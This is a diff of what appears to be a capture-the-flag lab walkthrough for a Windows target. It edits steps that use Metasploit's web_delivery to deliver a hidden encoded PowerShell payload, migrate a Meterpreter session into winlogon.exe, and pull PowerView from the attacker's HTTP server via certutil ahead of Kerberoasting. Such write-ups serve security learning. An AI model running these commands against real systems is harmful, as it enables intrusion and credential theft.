@@ -64,7 +64,7 @@ cat c:\users\administrator\desktop\flag.txt
 We will have to elevate our privileges and get a proper shell on the target, lets do so using Meterpreter 
 
 We will use the ***web_delivery*** exploit
-## Use Metasploit 
+## Use Metasploit to elevate the shell
 ```bash
 msfconsole -q 
 search web_delivery
@@ -85,17 +85,35 @@ powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0
 
 ```
 ### Shell Obtained in Meterpreter
+![[Pasted image 20251015192935.png]]
+### Migrating the Process
+We have to migrate to the process that we just created as some commands required higher privileges
+use the command ***ps*** to list the processes
+![[Pasted image 20251015193203.png]]
 
+Then we need to migrate to the process with the name of ***winlogon.exe***
+```
+migrate process_ID
+```
+![[Pasted image 20251015193309.png]]
 
-## Download PowerView or Host
-I already have it on my machine, but it can be downloaded here; [PowerTools/PowerView/powerview.ps1 at master · PowerShellEmpire/PowerTools · GitHub](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)
-## Host PowerView using a Python Server (attacker Machine)
+## Use PowerView to perform Kerberoasting
+### Download PowerView on the attacker machine
+I already have it on my machine, but it can be downloaded using the following
+```
+wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+```
+### Host PowerView using a Python Server (attacker Machine)
 ```
 python -m http.server 9090 
 ```
-
-## Download PowerView from the Target Machine
+### Download the PowerView file on the target machine
 ```
+# In Meterpreter
 
+shell
+
+# Then
+
+certutil.exe -f -urlcache -split http://10.10.14.117:9090/PowerView.ps1 PowerView.ps1
 ```
-
